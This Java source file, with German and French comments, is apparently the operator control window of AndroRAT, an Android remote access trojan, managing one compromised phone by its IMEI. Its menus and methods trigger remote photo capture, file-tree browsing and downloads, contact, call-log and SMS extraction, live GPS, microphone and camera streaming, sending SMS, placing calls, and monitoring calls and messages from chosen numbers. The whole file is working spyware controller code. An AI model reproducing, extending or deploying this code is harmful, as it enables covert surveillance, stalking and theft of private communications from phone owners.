package gui;

import gui.panel.*;

import inout.Protocol;
import utils.Contact;
import utils.MyFile;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JMenuBar;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import javax.swing.BoxLayout;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import javax.swing.KeyStroke;

import Packet.AdvancedInformationPacket;
import Packet.CallPacket;
import Packet.SMSPacket;

import java.awt.event.KeyEvent;
import java.awt.event.InputEvent;
import java.awt.Color;
import java.awt.Toolkit;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import javax.swing.JSplitPane;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

/**
 * Diese Klasse ist zu Verwaltung der GUI zuständig.
 */
public class UserGUI extends JFrame implements WindowListener {
	
	private JPanel contentPane;
	private JTabbedPane tabbedPane;
	
	private HomePanel homePanel;
	private MapPanel mapPanel;
	private SoundPanel soundPanel;
	private PicturePanel picturePanel;
	private FileTreePanel fileTreePanel;
	private CallLogPanel callLogPanel;
	private ContactPanel contactPanel;
	private MonitorPanel monitorCall, monitorSMS;
	private VideoPanel videoPanel;
	private ColorPane userLogPanel;
	private SMSLogPanel smsPanel;
	private AlarmPanel alarmPanel;
	
	private HashMap<JPanel, Integer> panChanMap;
	
	private String imei;
	private GUI gui;

	/**
	 * Der Konstruktor erstellt eine neue GUI für den Benutzer. Außerdem werden die übergebenen Daten gespeichert.
	 * @param imei	Die Imei
	 * @param gui	Die Gui
	 */
	public UserGUI(String imei, GUI gui) {
		setIconImage(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png")));
		this.imei = imei;
		this.gui = gui;
		
		panChanMap = new HashMap<JPanel, Integer>();
		
		this.initGUI();
		
		this.setLocationRelativeTo(null);
		this.setTitle("User GUI of imei : "+imei);
		this.setVisible(true);
		this.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		this.fireGetAdvancedInformations();
	}

	/**
	 * Erstellt einen Nachrichten Dialog
	 * @param txt	Der Text
	 * @param title	Der Titel
	 * @param type	Die Art des Dialogs
	 */
	public void launchMessageDialog(String txt, String title, int type) {
		JOptionPane.showMessageDialog(this,txt,title,type);
	}

	/**
	 * Diese Methode definiert die Aktionen, sollte das Fenster geschlossen werden.
	 * Hierbei werden sämtliche Streams und Monitoring Aktionen gestoppt.
	 * @param e	Das Event
	 */
	@Override
	public void windowClosing(WindowEvent e) {
		System.out.println("Closing user window");
		if(mapPanel != null) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
		}
		if(soundPanel != null) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
		}
		if(monitorCall != null) {
			if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
		}
		if(monitorSMS != null) {
			if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
		}
		if(videoPanel != null) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
		}
		gui.closeUserGUI(imei);
	}

	/**
	 * Diese Methode ist zum Schließen von einzelnen Tabs zuständig.
	 * Es wird nicht nur die Klassenvariable auf null gesetzt, sondern gegebenenfalls noch aktive Streams oder Monitoringobjekte beendet.
	 * @param viewer	Das Panel welches geschlossen werden soll.
	 */
	public void removeTab(JPanel viewer) {
		if(viewer instanceof MapPanel) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
			mapPanel = null;
		}
		if(viewer instanceof SoundPanel) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
			soundPanel = null;
		}
		if(viewer instanceof VideoPanel) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
			videoPanel = null;
		}
		if(viewer instanceof PicturePanel) picturePanel = null;
		if(viewer instanceof AlarmPanel) alarmPanel = null;
		if(viewer instanceof FileTreePanel) fileTreePanel = null;
		if(viewer instanceof CallLogPanel) callLogPanel = null;
		if(viewer instanceof SMSLogPanel) smsPanel = null;
		if(viewer instanceof ContactPanel) contactPanel = null;
		if(viewer instanceof MonitorPanel) {
			if(((MonitorPanel) viewer).getCallMonitor()) {
				if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
				monitorCall = null;
			} else {
				if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
				monitorSMS = null;
			}
		}
		tabbedPane.remove(viewer);
	}
	
	
	// ********************
	// M�thodes pour home
	// ********************

	/**
	 * Erhält ein AdvancedInformationPacket und ruft die updateInformations Mehtode auf, um die neuen Daten auf der GUI anzuzeigen.
	 * @param packet	Das Paket
	 */
	public void updateHomeInformations(AdvancedInformationPacket packet) {
		homePanel.updateInformations(packet);
	}

	/**
	 * Bekommt die Preference Daten und ruft die updatePreferences Methode auf, um diese auf der GUI anzuzeigen.
	 * @param ip	Die IP
	 * @param port	Der Port
	 * @param wait	wait
	 * @param phones	Die Telefonnummerliste
	 * @param sms	Die Smsnummerliste
	 * @param kw	Die Schlüsselwortliste
	 */
	public void updatePreference(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		homePanel.updatePreferences(ip, port, wait, phones, sms, kw);
	}

	/**
	 * Diese Methode ruft die fireGetAdvInformations der Klasse Gui auf, und übergibt dieser die IMEI.
	 */
	public void fireGetAdvancedInformations() {
		gui.fireGetAdvInformations(imei);
	}

	/**
	 * Diese Methode ist zum Speichern der Verbindugnsinformationen auf dem Client. Dazu wird die Methode fireSaveConnetConfiguration der Klasse GUI aufgerufen.
	 * @param ip	DIe IP
	 * @param port	Der Port
	 * @param wait	wait
	 * @param phones	Die Telefonnummernliste
	 * @param sms	Die Smsnummernliste
	 * @param kw	Die Schlüsselwörterliste
	 */
	public void fireSaveConnectConfigurations(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		gui.fireSaveConnectConfiguration(imei, ip, port, wait, phones, sms, kw);
	}
	
	
	
	// ********************
	// M�thodes pour la Map
	// ********************

	/**
	 * Methode zum Updaten der Daten der Map. Hierzu werden die neuen GPSdaten übergeben.
	 * @param lat	georgrphische Breite
	 * @param lon	georgrphische Länge
	 * @param alt	georgrphische Höhe
	 * @param speed	Geschwindigkeit
	 * @param accuracy	Genauigkeit
	 */
	public void updateMap(double lon, double lat, double alt, float speed, float accuracy) {
		if(mapPanel != null) mapPanel.updateMap(lon, lat, alt, speed, accuracy);
	}

	/**
	 * Diese Methode ist zum Starten des GPS Streams vorhanden.
	 * Dazu wird die Methode fireStartGPSStreaming aufgerufen.
	 * @param provider	Der Provider
	 */
	public void fireStartGPSStreaming(String provider) {
		gui.fireStartGPSStreaming(imei, provider);
	}

	/**
	 * Diese Methode ist zum Beenden des GPS Steams vorhanden.
	 * Dazu wird die Methode fireStopGPSStreaming aufgerufen.
	 */
	public void fireStopGPSStreaming() {
		gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
	}
	
	
	// *********************
	// M�thodes pour l'image
	// *********************

	/**
	 * Erhält ein Bild als byte-Array präsentiert dies auf der GUI .
	 * @param picture	Das Bild
	 */
	public void updatePicture(byte[] picture) {
		if(picturePanel != null) picturePanel.updateImage(picture);
	}

	/**
	 * Diese Methode ruft die fireTakePicture Methode der GUI auf.
	 * Hiermit wird die Anfrage ein Bild aufzunehmen an den Client gesendet.
	 */
	public void fireTakePicture(String cam) {
		gui.fireTakePicture(imei,cam);
	}

	public void fireSetAlarm(byte[] args){gui.fireAlarm(imei,args);}
	
	
	// *********************
	// M�thodes pour le son
	// *********************

	/**
	 * Zum Aktualisieren der Sounddaten des SoundPanels
	 * @param data	Die Sounddaten
	 */
	public void addSoundBytes(byte[] data) {
		if(soundPanel != null) soundPanel.addSoundBytes(data);
	}

	/**
	 * Startet den SoundStream, indem die Methode fireStartSoundStreaming aufgerufen wird.
	 * @param source	Die Quelle des Stream.
	 */
	public void fireStartSoundStreaming(int source) {
		gui.fireStartSoundStreaming(imei, source);
	}

	/**
	 * Stoppt den Soundstream. Dazu wird die Methode fireStopSoundStreaming aufgerufen.
	 */
	public void fireStopSoundStreaming() {
		gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
	}
	
	
	// ****************************
	// M�thodes pour la video
	// ****************************

	/**
	 * Diese Methode ist zum aktualisieren der Videodaten vorhanden.
	 * @param data	Die Videoodaten
	 */
	public void addVideoBytes(byte[] data) {
		if(videoPanel != null)
			videoPanel.addVideoBytes(data);
	}

	/**
	 * Methode zum Starten des Videostreams.
	 */
	public void fireStartVideoStream(byte[] cam) {
		gui.fireStartVideoStream(imei, cam);
	}

	/**
	 * Methode zum Beenden des Videostreams.
	 */
	public void fireStopVideoStream(String path, String name) {
		gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
		if (path != null || name !=null){
			try {
				Thread.sleep(1000);
			}catch ( Exception e){

			}
			gui.fireFileDownload(imei,path,"download",name);
		}
	}

	// ****************************
	// M�thodes pour l'arborescence
	// ****************************

	/**
	 * Diese Methode ist zum Aktualisieren des FileTreeTabs.
	 * @param fileList	Die Ordnerstruktur
	 */
	public void updateFileTree(ArrayList<MyFile> fileList) {
		if(fileTreePanel != null) fileTreePanel.updateFileTree(fileList);
	}

	/**
	 * Diese Methode ist zum Herunterladen von Dateien vorhanden.
	 * @param path	Der Pfad auf dem Handy
	 * @param downPath	der Speicherpfad
	 * @param downName	Der Name der Datei
	 */
	public void fireFileDownload(String path, String downPath, String downName) {
		gui.fireFileDownload(imei, path, downPath, downName);
	}

	/**
	 * Ruft die Methode fireTreeFile der Klasse GUI auf und fordert somit die Ordnerstruktur des Clients an.
	 */
	public void fireTreeFile() {
		gui.fireTreeFile(imei);
	}
	
	
	// ****************************
	// M�thodes pour les call logs
	// ****************************

	/**
	 * Diese Methode ist zum Aktualisiern der Anrufliste vorhanden.
	 * @param logsList	Die Anrufliste
	 */
	public void updateCallLogs(ArrayList<CallPacket> logsList) {
		if(callLogPanel != null) callLogPanel.updateCallLogs(logsList);
	}

	/**
	 * Diese Methode ist zum Absenden einer Anfrage, die Anruflisten auszulesen, zuständig.
	 * Dazu wird die fireCallLogs Methode der Klasse GUI aufgerufen.
	 * @param request	Die Filter
	 */
	public void fireGetCallLogs(String request) {
		gui.fireCallLogs(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les SMS
	// ****************************

	/**
	 * Diese Methode ist zum Aktualisieren der Daten des SMSPanel vorhanden.
	 * @param sms	Die SMS Pakete
	 */
	public void updateSMS(ArrayList<SMSPacket> sms) {
		if(smsPanel != null) smsPanel.updateSMS(sms);
	}

	/**
	 * Diese Methode ist zum Erstellen einer Anfrage, um die SMS des Clients auszulesen.
	 * @param request	Die Filter
	 */
	public void fireGetSMS(String request) {
		gui.fireGetSMS(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les contacts
	// ****************************

	/**
	 * Diese Methode ist zum Aktualisieren der Daten des Kontakttabs.
	 * @param contacts	Die Kontakte
	 */
	public void updateContacts(ArrayList<Contact> contacts) {
		if(contactPanel != null) contactPanel.updateContactList(contacts);
	}

	/**
	 * Methode zum Senden der Anfrage um die Kontakte des Clients zu erhalten.
	 */
	public void fireGetContacts() {
		gui.fireContacts(imei);
	}

	/**
	 * Diese Methode ist, um einen Anruf auf dem Client zu starten.
	 * @param number Die Telefonnummer
	 */
	public void fireGiveCall(String number) {
		gui.fireGiveCall(imei, number);
	}

	/**
	 * Diese Methode ist zum Senden von SMS vorhanden.
	 * @param number	Die Telefonnummer
	 * @param txt	Die Nachricht
	 */
	public void fireSendSMS(String number, String txt) {
		HashMap<String, String> map = new HashMap<String, String>();
		map.put(Protocol.KEY_SEND_SMS_NUMBER, number);
		map.put(Protocol.KEY_SEND_SMS_BODY, txt);
		gui.fireSendSMS(imei, map);
	}
	
	
	// ****************************
	// M�thodes pour monitors
	// ****************************

	/**
	 * Diese Methode ist zum Aktualisieren der Monitordaten.
	 * @param type	Die Art des Anrufs
	 * @param phoneNumber	Die Telefonnummer
	 */
	public void addMonitoredCall(int type, String phoneNumber) {
		if(monitorCall != null) monitorCall.addMonitoredCall(type, phoneNumber);
	}

	/**
	 * Diese Methode ist zum Aktualisieren von SMS Motnirodaten.
	 * @param addr	Die Telefonnummer
	 * @param date	Das Datum
	 * @param body	Die Nachricht
	 */
	public void addMonitoredSMS(String addr, long date, String body) {
		if(monitorSMS != null) monitorSMS.addMonitoredSMS(addr, date, body);
	}

	/**
	 * Zum Starten des CallMonitors
	 * @param phoneNumbers	Die Telefonnummer
	 */
	public void fireStartCallMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartCallMonitoring(imei, phoneNumbers);
	}

	/**
	 * Methode zum Beende des CallMonitors.
	 */
	public void fireStopCallMonitoring() {
		gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
	}

	/**
	 * Methode zum Starten des SMSMonitor
	 * @param phoneNumbers Die Telefonnummer
	 */
	public void fireStartSMSMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartSMSMonitoring(imei, phoneNumbers);
	}

	/**
	 * Methode zum Stoppen des SMSMonitor
	 */
	public void fireStopSMSMonitoring() {
		gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
	}
	
	
	// ****************************
	// M�thodes de save channel
	// ****************************

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten.
	 * @param channel	Der Datenkanal
	 */
	public void saveMapChannel(int channel) {
    	panChanMap.put(mapPanel, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die CallLogDaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveCallLogChannel(int channel) {
    	panChanMap.put(callLogPanel, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveContactChannel(int channel) {
    	panChanMap.put(contactPanel, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die Smsdaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveMonitorSMSChannel(int channel) {
    	panChanMap.put(monitorSMS, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die CallMonitordaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveMonitorCallChannel(int channel) {
    	panChanMap.put(monitorCall, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten.
	 * @param channel	Der Datenkanal
	 */
    public void savePictureChannel(int channel) {
    	panChanMap.put(picturePanel, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die Sounddaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveSoundChannel(int channel) {
    	panChanMap.put(soundPanel, channel);
    }

	/**
	 * Diese Methode ist zum Speichern des Datenkanals für die Videodaten.
	 * @param channel	Der Datenkanal
	 */
    public void saveVideoChannel(int channel) {
    	panChanMap.put(videoPanel, channel);
    }
	
	
	// ****************************
	// M�thodes des boutons UserGUI
	// ****************************

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Bildpanels vorhanden.
	 */
	private void fireButtonTakePicture() {
		if(picturePanel == null) {
			picturePanel = new PicturePanel(this);
			tabbedPane.addTab("Picture viewer", picturePanel);
		}
		tabbedPane.setSelectedComponent(picturePanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Ordnerpanels vorhanden.
	 */
	private void fireButtonFileTree() {
		if(fileTreePanel == null) {
			fileTreePanel = new FileTreePanel(this);
			tabbedPane.addTab("File tree viewer", fileTreePanel);
		}
		tabbedPane.setSelectedComponent(fileTreePanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Anruflistenpanels vorhanden.
	 */
	private void fireButtonCallLogs() {
		if(callLogPanel == null) {
			callLogPanel = new CallLogPanel(this);
			tabbedPane.addTab("Call logs", callLogPanel);
		}
		tabbedPane.setSelectedComponent(callLogPanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Kontaktpanels vorhanden.
	 */
	private void fireButtonContacts() {
		if(contactPanel == null) {
			contactPanel = new ContactPanel(this);
			tabbedPane.addTab("Contacts", contactPanel);
		}
		tabbedPane.setSelectedComponent(contactPanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des GPSpanels vorhanden.
	 */
	private void fireButtonStreamingGPS() {
		if(mapPanel == null) {
			mapPanel = new MapPanel(this);
			tabbedPane.addTab("Map viewer", mapPanel);
		}
		tabbedPane.setSelectedComponent(mapPanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Soundpanels vorhanden.
	 */
	private void fireButtonStreamingSound() {
		if(soundPanel == null) {
			soundPanel = new SoundPanel(this);
			tabbedPane.addTab("Sound listener", soundPanel);
		}
		tabbedPane.setSelectedComponent(soundPanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Videopanels vorhanden.
	 */
	private void fireButtonStreamingVideo() {
		if(videoPanel == null) {
			videoPanel = new VideoPanel(this);
			tabbedPane.addTab("Video player", videoPanel);
		}
		tabbedPane.setSelectedComponent(videoPanel);
	}

	private void fireButtonAlarm() {
		if(alarmPanel == null) {
			alarmPanel = new AlarmPanel(this);
			tabbedPane.addTab("Alarm", alarmPanel);
		}
		tabbedPane.setSelectedComponent(alarmPanel);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Smspanels vorhanden.
	 */
	private void fireButtonSMS() {
		if(smsPanel == null) {
			smsPanel = new SMSLogPanel(this);
			tabbedPane.addTab("SMS viewer", smsPanel);
		}
		tabbedPane.setSelectedComponent(smsPanel);
	}



	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des Toastdialogs vorhanden.
	 */
	private void fireButtonToastMessage() {
		String txt = JOptionPane.showInputDialog(this, "Enter your text :");
		gui.fireToastMessage(imei, txt);
	}

	/**
	 * Diese Methode ist zum beenden des Fensters
	 */
	private void fireButtonFinish() {
		this.windowClosing(null);
		this.dispose();
	}

	/**
	 * Diese Methode ist zum Beenden und Entfernen der einzelnen Tabs
	 */
	public void fireButtonCloseTab() {
		JPanel panel = (JPanel) tabbedPane.getSelectedComponent();
		if(panel == homePanel) {
			JOptionPane.showMessageDialog(this,"You can't close the home tab !","Forbiden action",JOptionPane.ERROR_MESSAGE);
		} else {
			this.removeTab(panel);
		}
	}

	/**
	 * Diese Methode ist zum Erstellen des SMSdialogs
	 */
	private void fireButtonSendSMS() {
		SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			gui.fireSendSMS(imei, map);
		}
	}

	/**
	 * Diese Methode ist zum Erstellen eines Anrufdialogs
	 */
	private void fireButtonGiveCall() {
		String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
		if(target != null) gui.fireGiveCall(imei, target);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des AnrufMonitorpanels vorhanden.
	 */
	private void fireButtonMonitorCall() {
		if(monitorCall == null) {
			monitorCall = new MonitorPanel(this, true);
			tabbedPane.addTab("Call monitor", monitorCall);
		}
		tabbedPane.setSelectedComponent(monitorCall);
	}

	/**
	 * Diese Methode ist zum Erstellen und Hinzufügen des SmsMonitorpanels vorhanden.
	 */
	private void fireButtonMonitorSMS() {
		if(monitorSMS == null) {
			monitorSMS = new MonitorPanel(this, false);
			tabbedPane.addTab("SMS monitor", monitorSMS);
		}
		tabbedPane.setSelectedComponent(monitorSMS);
	}
	
	
	
	

	/**
	 * Zum Erstellen des UserGui Fensters.
	 */
	private void initGUI() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 672, 584);
		
		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);
		
		JMenu mnOptions = new JMenu("Options");
		menuBar.add(mnOptions);
		
		JMenuItem mntmCloseInterface = new JMenuItem("Close Window");
		mntmCloseInterface.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFinish();
			}
		});
		
		JMenuItem mntmCloseTabViewer = new JMenuItem("Close Tab");
		mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
		mntmCloseTabViewer.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCloseTab();
			}
		});
		mnOptions.add(mntmCloseTabViewer);
		mnOptions.add(mntmCloseInterface);
		
		JMenu mnRcuprationDeDonnes = new JMenu("Get Android data");
		menuBar.add(mnRcuprationDeDonnes);
		
		JMenuItem mntmPrendrePhoto = new JMenuItem("Take picture");
		mnRcuprationDeDonnes.add(mntmPrendrePhoto);
		mntmPrendrePhoto.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonTakePicture();
			}
		});
		
		JMenuItem mntmFileTree = new JMenuItem("File tree");
		mnRcuprationDeDonnes.add(mntmFileTree);
		mntmFileTree.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFileTree();
			}
		});
		
		JMenuItem mntmContacts = new JMenuItem("Contacts");
		mnRcuprationDeDonnes.add(mntmContacts);
		mntmContacts.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonContacts();
			}
		});
		
		JMenuItem mntmCallLogs = new JMenuItem("Call logs");
		mnRcuprationDeDonnes.add(mntmCallLogs);
		mntmCallLogs.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCallLogs();
			}
		});
		
		JMenuItem mntmSms = new JMenuItem("SMS");
		mntmSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fireButtonSMS();
			}
		});
		mnRcuprationDeDonnes.add(mntmSms);

		JMenuItem mntmAlarm = new JMenuItem("Alarm");
		mntmAlarm.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fireButtonAlarm();
			}
		});
		mnRcuprationDeDonnes.add(mntmAlarm);
		
		JMenu mnStreaming = new JMenu("Streaming");
		mnRcuprationDeDonnes.add(mnStreaming);
		
		JMenuItem mntmCoordonnesGps = new JMenuItem("Localisation");
		mntmCoordonnesGps.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingGPS();
			}
		});
		mnStreaming.add(mntmCoordonnesGps);
		
		JMenuItem mntmSon = new JMenuItem("Audio");
		mntmSon.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingSound();
			}
		});
		mnStreaming.add(mntmSon);
		
		JMenuItem mntmVido = new JMenuItem("Video");
		mntmVido.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingVideo();
			}
		});
		mnStreaming.add(mntmVido);
		
		JMenu mnEnvoiDeCommandes = new JMenu("Send command");
		menuBar.add(mnEnvoiDeCommandes);
		
		JMenuItem mntmSendToastMessage = new JMenuItem("Toast message");
		mntmSendToastMessage.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonToastMessage();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendToastMessage);
		
		JMenuItem mntmSendSms = new JMenuItem("Send SMS");
		mntmSendSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonSendSMS();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendSms);
		
		JMenuItem mntmGiveCall = new JMenuItem("Give call");
		mntmGiveCall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonGiveCall();
			}
		});
		mnEnvoiDeCommandes.add(mntmGiveCall);
		
		JMenu mnMonitoring = new JMenu("Monitoring");
		menuBar.add(mnMonitoring);
		
		JMenuItem mntmCallMonitor = new JMenuItem("Call monitor");
		mntmCallMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorCall();
			}
		});
		mnMonitoring.add(mntmCallMonitor);
		
		JMenuItem mntmSmsMonitor = new JMenuItem("SMS monitor");
		mntmSmsMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorSMS();
			}
		});
		mnMonitoring.add(mntmSmsMonitor);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BoxLayout(contentPane, BoxLayout.X_AXIS));
		
		JSplitPane splitPane = new JSplitPane();
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		contentPane.add(splitPane);
		
		JScrollPane scrollPane = new JScrollPane();
		splitPane.setRightComponent(scrollPane);
		
        userLogPanel = new ColorPane();
        scrollPane.setViewportView(userLogPanel);
		
        //JTextArea textArea = new JTextArea();
		//scrollPane.setViewportView(textArea);
		
		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		splitPane.setLeftComponent(tabbedPane);
		
		homePanel = new HomePanel(this);
		tabbedPane.addTab("Home", null, homePanel, null);
		
		//tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		//contentPane.add(tabbedPane);
		//splitPane.add(tabbedPane);
		
		addWindowListener(this);
	}

	@Override
	public void windowOpened(WindowEvent e) {
	}

	@Override
	public void windowClosed(WindowEvent e) {
	}

	@Override
	public void windowIconified(WindowEvent e) {
	}

	@Override
	public void windowDeiconified(WindowEvent e) {
	}

	@Override
	public void windowActivated(WindowEvent e) {
	}

	@Override
	public void windowDeactivated(WindowEvent e) {
	}

	/**
	 * Gibt die IMEI zurück.
	 * @return Die IMEI
	 */
	public String getImei() {
		return imei;
	}

	/**
	 * Gibt die GUI zurück.
	 * @return	Die Gui
	 */
	public GUI getGUI() {
		return gui;
	}

	/**
	 * Diese Methode ist zum Erstellen der Lognachricht.
	 * @param date	Das Datum
	 * @param txt	Der Text
	 */
    public void logTxt(long date, String txt) {
    	userLogPanel.append(Color.black, (new Date(date)+ " "+txt+"\n"));
    }

	/**
	 * Diese Methode ist zum Erstellen der Fehlernachricht
	 * @param date	Das Datum
	 * @param txt	Der Text
	 */
    public void errLogTxt(long date, String txt) {
    	userLogPanel.append(Color.red, (new Date(date)+ " "+txt+"\n"));
    }
	 public boolean fileComplete(){
		 return gui.getDownloadComplete();
	 }
	public void setFileComplete(boolean b){
		gui.setDownloadComplete(b);
	}

}
